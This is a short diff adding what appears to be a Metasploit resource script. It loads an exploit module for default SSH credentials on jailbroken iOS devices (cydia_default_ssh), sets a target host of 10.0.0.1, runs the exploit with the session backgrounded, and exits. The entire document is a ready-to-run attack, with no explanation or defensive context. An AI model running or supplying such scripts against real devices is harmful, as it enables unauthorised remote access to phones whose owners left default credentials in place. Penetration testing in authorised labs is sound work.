@@ -1,0 +1,4 @@
+use exploit/apple_ios/ssh/cydia_default_ssh
+set RHOST 10.0.0.1
+exploit -z
+exit
